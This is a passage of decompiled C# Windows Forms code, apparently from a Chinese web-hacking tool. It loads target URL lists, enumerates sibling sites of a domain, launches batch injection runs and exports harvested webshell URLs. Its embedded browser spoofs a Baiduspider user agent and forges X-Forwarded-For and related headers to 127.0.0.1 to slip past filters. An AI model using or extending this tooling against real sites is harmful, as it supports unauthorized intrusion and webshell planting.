		private void EndyeshuPiliangzhuru(IAsyncResult arResult)
		{
			GC.Collect();
		}
		private void button26_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.InitialDirectory = "c:\\";
			openFileDialog.Filter = "txt files (*.txt)|*.txt|All files (*.*)|*.*";
			openFileDialog.FilterIndex = 2;
			openFileDialog.RestoreDirectory = true;
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				this.listBox4.Items.Clear();
				if (openFileDialog.OpenFile() != null)
				{
					string vvc = openFileDialog.FileName;
					StreamReader srReader = new StreamReader(vvc);
					string admin_path;
					while ((admin_path = srReader.ReadLine()) != null)
					{
						string bbv = admin_path;
						bbv = bbv.Replace("http://", "");
						bbv = bbv.Replace("https://", "");
						this.listBox4.Items.Add(bbv);
					}
					srReader.Close();
				}
			}
		}
		private void button27_Click(object sender, EventArgs e)
		{
			FormMain.yeshuPiliangZhuru delStartGetTable = new FormMain.yeshuPiliangZhuru(this.zhurudian);
			AsyncCallback callBackWhenDone = new AsyncCallback(this.EndyeshuPiliangzhuru);
			delStartGetTable.BeginInvoke(callBackWhenDone, null);
		}
		private void button28_Click(object sender, EventArgs e)
		{
			try
			{
				this.listBox4.Items.Clear();
				for (int i = 0; i < this.listView1.Items.Count; i++)
				{
					this.listBox4.Items.Add(this.listView1.Items[i].SubItems[1].Text);
				}
			}
			catch
			{
				MessageBox.Show("导入失败");
			}
		}
		private void button29_Click(object sender, EventArgs e)
		{
			this.listBox4.Items.Clear();
			for (int i = 0; i < this.listBox2.Items.Count; i++)
			{
				string[] cli = this.listBox2.Items[i].ToString().Split(new char[]
				{
					' '
				});
				if (!this.listBox4.Items.Contains(cli[0].ToString()))
				{
					this.listBox4.Items.Add(cli[0].ToString());
				}
			}
		}
		private void 复制ToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			if (this.listBox6.Items.Count > 0)
			{
				string bb = this.listBox6.SelectedItem.ToString();
				if (this.listBox6.SelectedItems.Count > 0 && !string.IsNullOrEmpty(bb) && this.listBox6.SelectedItem.ToString() != "")
				{
					Clipboard.SetDataObject(bb);
				}
			}
		}
		private void 全部导出ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				SaveFileDialog sfd = new SaveFileDialog();
				sfd.Filter = "日志文件（*.txt）|*.txt";
				sfd.FilterIndex = 1;
				sfd.RestoreDirectory = true;
				if (sfd.ShowDialog() == DialogResult.OK)
				{
					string localFilePath = sfd.FileName.ToString();
					if (!File.Exists(localFilePath))
					{
						FileStream fs = new FileStream(localFilePath, FileMode.Create, FileAccess.Write);
						fs.Close();
						StreamWriter sw = new StreamWriter(localFilePath, true);
						for (int cv = 0; cv < this.listBox6.Items.Count; cv++)
						{
							string[] cli = this.listBox6.Items[cv].ToString().Split(new char[]
							{
								' '
							});
							sw.WriteLine(cli[0].ToString());
						}
						sw.Close();
					}
					else
					{
						StreamWriter sw2 = new StreamWriter(localFilePath, true);
						for (int cv2 = 0; cv2 < this.listBox6.Items.Count; cv2++)
						{
							string[] cli2 = this.listBox6.Items[cv2].ToString().Split(new char[]
							{
								' '
							});
							sw2.WriteLine(cli2[0].ToString());
						}
						sw2.Close();
					}
					MessageBox.Show("导出完毕!");
				}
			}
			catch
			{
			}
		}
		private void button8_Click(object sender, EventArgs e)
		{
			if (this.textBox2.Text == "")
			{
				MessageBox.Show("请输入目标网址", "提示", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				return;
			}
			string cookie = this.textBox11.Text;
			string Referer = this.textBox12.Text;
			if (cookie != "" && !this.header.Contains("Cookie"))
			{
				this.header = this.header + "\r\nCookie:" + cookie;
			}
			if (Referer != "" && !this.header.Contains("header"))
			{
				this.header = this.header + "\r\nReferer:" + Referer + "\r\nX-Forwarded-For:127.0.0.1\r\nCLIENT_IP:127.0.0.1\r\nREMOTE_ADDR:127.0.0.1\r\nVIA:127.0.0.1";
			}
			this.wb_browser.Navigate(this.textBox2.Text, null, null, this.header);
		}
		private void wb_browser_Navigated(object sender, WebBrowserNavigatedEventArgs e)
		{
			this.textBox2.Text = this.wb_browser.Url.ToString();
		}
		private void WebBrowser_BeforeNavigate2(object pDisp, ref object URL, ref object Flags, ref object TargetFrameName, ref object PostData, ref object Headers, ref bool Cancel)
		{
			if ((Headers == null || !Headers.ToString().Contains("Baiduspider")) && PostData != null)
			{
				this.wb_browser.Navigate(URL.ToString(), "", PostData as byte[], this.header);
			}
		}
		private void FormMain_Load(object sender, EventArgs e)
		{
			this.header = "User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\r\nContent-Type: application/x-www-form-urlencoded";
			string cookie = this.textBox11.Text;
			string Referer = this.textBox12.Text;
			if (cookie != "" && !this.header.Contains("Cookie"))
			{
				this.header = this.header + "\r\nCookie:" + cookie;
			}
			if (Referer != "" && !this.header.Contains("header"))
			{
				this.header = this.header + "\r\nReferer:" + Referer;
			}
		}
		private void button18_Click(object sender, EventArgs e)
		{
			try
			{
				this.wb_browser.GoBack();
			}
			catch (Exception)
			{
			}
		}
		private void button17_Click(object sender, EventArgs e)
		{
			try
			{
				this.wb_browser.GoForward();
			}
			catch (Exception)
			{
			}
		}
		private void button19_Click(object sender, EventArgs e)
		{
			try
			{
				this.wb_browser.GoHome();
			}
			catch (Exception)
			{
			}
		}
		private void 导出ToolStripMenuItem4_Click(object sender, EventArgs e)
		{
			SaveFileDialog sfd = new SaveFileDialog();
			sfd.Filter = "日志文件（*.txt）|*.txt";
			sfd.FilterIndex = 1;
			sfd.RestoreDirectory = true;
			if (sfd.ShowDialog() == DialogResult.OK)
			{
				string localFilePath = sfd.FileName.ToString();
				if (!File.Exists(localFilePath))
				{
					FileStream fs = new FileStream(localFilePath, FileMode.Create, FileAccess.Write);
					fs.Close();
					StreamWriter sw = new StreamWriter(localFilePath, true);
					for (int cv = 0; cv < this.listView1.Items.Count; cv++)
					{
						sw.WriteLine(this.listView1.Items[cv].SubItems[1].Text);
					}
					sw.Close();
				}
				else
				{
					StreamWriter sw2 = new StreamWriter(localFilePath, true);
					for (int cv2 = 0; cv2 < this.listView1.Items.Count; cv2++)
					{
						sw2.WriteLine(this.listView1.Items[cv2].SubItems[1].Text);
					}
					sw2.Close();
				}
				MessageBox.Show("导出完毕!");
			}
		}
		private void button32_Click(object sender, EventArgs e)
		{
			this.listView1.Items.Clear();
			FormMain.Yshupangzhan delStartGetTable = new FormMain.Yshupangzhan(this.getpangzhan);
			AsyncCallback callBackWhenDone = new AsyncCallback(this.EndGetwebsite);
			delStartGetTable.BeginInvoke(callBackWhenDone, null);
		}
		public void getpangzhan()
		{
			string shuju = new WebClient
			{
				Encoding = Encoding.Default
			}.DownloadString("http://i.links.cn/subdomain/" + this.textBox3.Text + ".html");
			MatchCollection matchs = new Regex(".<a.*?href=\"(?<url>.*?)\".*?>(?<content>.*?)</a>", RegexOptions.None).Matches(shuju);
			foreach (Match match in matchs)
			{
				if (match.Groups[2].ToString().Contains(this.textBox3.Text) && match.Groups[2].ToString().Contains("http://"))
				{
					ListViewItem item = new ListViewItem();
					item.Text = (this.listView1.Items.Count + 1).ToString();
					item.SubItems.Add(match.Groups[2].ToString().Replace("http://", ""));
					item.SubItems.Add("");
					this.listView1.Items.Add(item);
				}
			}
			if (this.listView1.Items.Count <= 0)
			{
				ListViewItem item2 = new ListViewItem();
				item2.Text = (this.listView1.Items.Count + 1).ToString();
				item2.SubItems.Add(this.textBox3.Text);
				item2.SubItems.Add("");
				this.listView1.Items.Add(item2);
			}
		}
		private void 导出shellToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SaveFileDialog sfd = new SaveFileDialog();
			sfd.Filter = "日志文件（*.txt）|*.txt";
			sfd.FilterIndex = 1;
			sfd.RestoreDirectory = true;
			if (sfd.ShowDialog() == DialogResult.OK)
			{
				string localFilePath = sfd.FileName.ToString();
				if (!File.Exists(localFilePath))
				{
					FileStream fs = new FileStream(localFilePath, FileMode.Create, FileAccess.Write);
					fs.Close();
					StreamWriter sw = new StreamWriter(localFilePath, true);
					for (int cv = 0; cv < this.listView3.Items.Count; cv++)
					{
						if (this.listView3.Items[cv].SubItems[3].Text.Contains("http://"))
						{
							sw.WriteLine(this.listView3.Items[cv].SubItems[3].Text);
						}
					}
					sw.Close();
				}
				else
				{
					StreamWriter sw2 = new StreamWriter(localFilePath, true);
					for (int cv2 = 0; cv2 < this.listView3.Items.Count; cv2++)
					{
						if (this.listView3.Items[cv2].SubItems[3].Text.Contains("http://"))
						{
							sw2.WriteLine(this.listView3.Items[cv2].SubItems[3].Text);
						}
					}
					sw2.Close();
				}
				MessageBox.Show("导出完毕!");
			}
		}
		private void 导入数据库ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				for (int cv = 0; cv < this.listView3.Items.Count; cv++)
				{
					if (this.listView3.Items[cv].SubItems[3].Text.Contains("安全隐患"))
					{
						this.listView3.Items[cv].Remove();
					}
				}
			}
			catch
			{
				MessageBox.Show("移出失败");
			}
		}
		public void InsertSQLshell(string shell)
		{
		}
		private void listView3_TabIndexChanged(object sender, EventArgs e)
		{
			GC.Collect();
		}
		private void label3_Click(object sender, EventArgs e)
		{
		}
		private void treeViewToolTree_AfterSelect_1(object sender, TreeViewEventArgs e)
		{
		}
		private void wb_browser_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
		{
		}
		private void groupBox7_Enter(object sender, EventArgs e)
		{
		}
	}
}
